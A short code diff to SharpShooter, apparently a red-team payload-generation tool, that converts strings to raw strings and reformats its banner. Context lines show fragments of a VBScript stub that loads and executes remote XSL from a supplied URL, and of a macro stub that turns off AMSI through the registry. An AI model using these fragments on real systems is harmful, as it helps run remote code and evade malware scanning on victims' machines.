@@ -35,7 +35,7 @@ except ImportError:
 
 
 class SharpShooter:
-    banner = """
+    banner = r"""
        _____ __                    _____ __                __           
       / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
       \__ \/ __ \/ __ `/ ___/ __ \\__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
@@ -43,8 +43,8 @@ class SharpShooter:
     /____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/     
                          /_/                                            
 
-     \033[1;32mDominic Chell, @domchell, MDSec ActiveBreach, v2.0\033[0;0m
-    """
+     %sDominic Chell, @domchell, MDSec ActiveBreach, v2.0%s
+    """ % ("\033[1;32m", "\033[0;0m")
 
     def validate_args(self):
         print(self.banner)
@@ -216,7 +216,7 @@ class SharpShooter:
     xsl.Load "%s"
     XML.transformNode xsl""" % (args.awlurl)
 
-        macro_amsi_stub = """    regpath = "HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable"
+        macro_amsi_stub = r"""    regpath = "HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable"
     Set oWSS = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")
     e = 0
     On Error Resume Next
